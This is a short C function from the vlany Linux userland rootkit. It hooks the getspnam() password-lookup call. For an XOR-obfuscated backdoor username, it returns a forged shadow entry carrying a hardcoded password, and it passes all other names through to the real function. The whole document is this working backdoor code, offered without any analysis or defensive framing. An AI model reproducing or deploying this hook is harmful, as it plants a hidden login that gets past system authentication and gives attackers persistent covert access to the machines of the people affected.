struct spwd *getspnam(const char *name)
{
    #ifdef PAM_DEBUG
        printf("[vlany] getspnam() called\n");
    #endif

    HOOK(old_getspnam, CGETSPNAM);
    
    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
    if(!strcmp(name, vlany_user))
    {
        struct spwd *vlanyspwd = malloc(sizeof(struct spwd));
        char *vlany_password = strdup(VLANY_PASSWORD); xor(vlany_password);

        vlanyspwd->sp_namp = strdup(vlany_user);
        vlanyspwd->sp_pwdp = strdup(vlany_password);
        vlanyspwd->sp_lstchg = time(NULL)/(60*60*24);
        vlanyspwd->sp_expire = time(NULL)/(60*60*24)+90;
        vlanyspwd->sp_inact = 9001;
        vlanyspwd->sp_warn = 0;
        vlanyspwd->sp_min = 0;
        vlanyspwd->sp_max = 99999;

        CLEAN(vlany_user);
        CLEAN(vlany_password);
        return vlanyspwd;
    }

    CLEAN(vlany_user);

    return old_getspnam(name);
}
